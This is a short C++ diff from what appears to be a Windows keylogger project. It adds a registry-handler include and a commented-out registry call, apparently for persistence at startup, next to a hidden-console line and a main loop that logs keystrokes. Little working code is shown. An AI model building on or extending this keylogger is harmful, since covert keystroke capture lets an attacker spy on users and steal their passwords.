@@ -1,6 +1,7 @@
 #include "logManager.h"
 #include "keyLogger.h"
 #include "windowManager.h"
+#include "registryHandler.h"
 
 std::string formatPrintable(keyStroke key);
 
@@ -15,6 +16,10 @@ int main()
     //windowManager::hideConsoleWindow();
 
     // Mainloop that logs the keystrokes.
+
+
+    //std::cout << registryHandler::addToRegistry();
+
     while(TRUE)
     {
         key = keyLogger::checkPressedKey();
